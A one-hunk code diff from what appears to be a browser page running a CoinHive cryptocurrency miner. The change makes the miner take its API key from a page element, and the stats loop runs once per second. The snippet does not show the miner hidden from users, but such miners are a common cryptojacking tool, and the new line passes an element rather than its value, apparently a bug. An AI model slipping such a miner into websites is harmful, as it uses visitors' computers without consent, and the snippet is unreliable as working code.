@@ -1,4 +1,4 @@
-var miner = new CoinHive.Anonymous(apiKey,'threads: 1');
+var miner = new CoinHive.Anonymous(document.getElementById("api"),'threads: 1');
 var timeDelay = 1000;
 	
 // Update stats once per second
